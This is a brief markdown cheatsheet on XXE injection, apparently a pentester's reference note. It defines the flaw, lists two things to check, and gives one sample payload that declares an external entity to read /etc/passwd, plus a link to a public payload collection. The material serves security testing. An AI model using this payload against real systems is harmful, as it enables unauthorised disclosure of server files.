---
tags:
  - xxe
  - injection
  - cheatsheet
---
# XXE Injection Cheatsheet

XXE is a vulnerability that occurs when an application parses XML input containing a reference to an external entity and the application is using a weakly configured XML parser. 

## Checks

- [ ] Check for any requests containing XML
- [ ] Are there any uploads that accept docx, xlsx, etc?

## Sample payloads

**Basic**

```xml title="Basic XXE to retrieve file"
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
```



## References

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files)

